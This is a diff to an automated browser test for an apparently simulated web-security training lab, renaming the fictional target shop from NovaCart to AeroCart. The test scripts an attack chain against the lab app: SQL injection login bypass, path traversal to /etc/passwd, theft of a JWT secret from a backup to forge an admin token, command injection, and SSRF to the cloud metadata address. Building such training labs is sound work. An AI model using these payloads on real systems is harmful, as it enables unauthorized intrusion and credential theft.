@@ -54,14 +54,14 @@ async function solveViaApi(p: Page, origin: string) {
     await nav('/support/ticket?id=9002');
     await nav('/login', 'POST', "username=admin'--&password=x");
     await nav('/api/order?id=5001');
-    await nav('/download?file=backups/novacart-db.sql.bak');
+    await nav('/download?file=backups/aerocart-db.sql.bak');
     await nav('/download?file=../../../../etc/passwd');
     const snap = await (await fetch(`${base}/lab/api/sessions/${sid}`, { credentials: 'include' })).json();
     // read the weak secret out of the backup we just exfiltrated (as a learner would)
     const backup = snap.view.history.find((h: any) => h.request.path === '/download' && h.request.query.includes('backups'));
     const secret = (backup.response.body.match(/JWT_SIGNING_SECRET='([^']+)'/) || [])[1];
     const tok = (await act(sid, 'terminal.exec', { line: `jwt sign ${secret} {"user":"admin","role":"admin"}` })).result.output.trim();
-    await act(sid, 'browser.setCookie', { name: 'nc_admin', value: tok });
+    await act(sid, 'browser.setCookie', { name: 'ac_admin', value: tok });
     await nav('/admin');
     await nav('/admin/ping?host=127.0.0.1;id');
     await nav('/admin/fetch?url=http://169.254.169.254/');
@@ -86,7 +86,7 @@ async function remediateViaApi(p: Page, origin: string, sid: string) {
       for (const o of f.options) { const r = await act('finding.remediate', { findingId: f.id, optionId: o.id }); if (r.ok) break; }
       await act('finding.retest', { findingId: f.id });
     }
-    await act('report.submit', { summary: 'NovaCart exposed nine exploitable web vulnerabilities across injection, broken access control, authentication and SSRF. All were confirmed, remediated and verified during this authorized engagement.' });
+    await act('report.submit', { summary: 'AeroCart exposed nine exploitable web vulnerabilities across injection, broken access control, authentication and SSRF. All were confirmed, remediated and verified during this authorized engagement.' });
   }, { base: origin, sid });
 }
 
@@ -99,14 +99,14 @@ try {
   assert(true, 'catalog loads after dev login');
 
   await page.getByRole('button', { name: 'Start engagement' }).click();
-  await page.getByRole('heading', { name: 'The Breach Files — NovaCart' }).waitFor();
+  await page.getByRole('heading', { name: 'The Breach Files — AeroCart' }).waitFor();
   await page.getByRole('button', { name: /Acknowledge/ }).click();
   assert(await page.getByText('Simulation').first().isVisible(), 'workspace shows the simulation banner');
 
   console.log('Recon in the terminal (xterm) — effect visible in the shared Proxy history');
   await page.getByRole('button', { name: 'Terminal', exact: true }).click();
   await page.locator('.xterm-helper-textarea').focus();
-  await page.keyboard.type('whatweb http://shop.novacart.lab/');
+  await page.keyboard.type('whatweb http://shop.aerocart.lab/');
   await page.keyboard.press('Enter');
   // xterm renders to a canvas (text not in the DOM); prove the command ran by its effect on shared state.
   await page.getByRole('button', { name: /^Proxy/ }).click();
